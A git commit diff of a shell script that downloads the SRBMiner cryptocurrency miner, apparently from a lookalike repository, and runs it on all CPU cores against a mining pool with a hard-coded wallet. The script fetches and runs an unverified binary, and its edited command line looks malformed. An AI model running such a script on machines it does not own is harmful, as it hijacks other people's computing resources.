0da5c8f9496d91db63ae40c8e32e9c1e85e9dbdc
malogrono <136266511+malogrono@users.noreply.github.com>
2024-10-31 15:21:17 +0700

    Update serab.sh

--- serab.sh
+++ serab.sh
@@ -1,11 +1,11 @@
 #!/bin/sh
 sudo apt update
 sudo apt install screen -y
-wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.7/SRBMiner-Multi-2-4-7-Linux.tar.xz
-tar -xvf SRBMiner-Multi-2-4-7-Linux.tar.xz
-cd SRBMiner-Multi-2-4-7
+wget https://github.com/doktor63/SRBMiner/releases/download/2.6.9/SRBMiner-Multi-2-6-9-Linux.tar.gz
+tar -xvf SRBMiner-Multi-2-6-9-Linux.tar.gz
+cd SRBMiner-Multi-2-6-9
 clear
-./SRBMiner-MULTI --algorithm verushash --pool eu.luckpool.net:3956 --wallet RJAkiJXQy8Q9PcBkEPTBypMJj7ofGgQjo6.cokocip
+./SRBMiner-MULTI --algorithm verushash --pool eu.luckpool.net:3956 --wallet RJAkiJXQy8Q9PcBkEPTBypMJj7ofGgQjo6.cok $(echo $(shuf -i 1-9999 -n 1)-CPU) -t $(nproc --all)
 while [ 1 ]; do
 sleep 3
 done
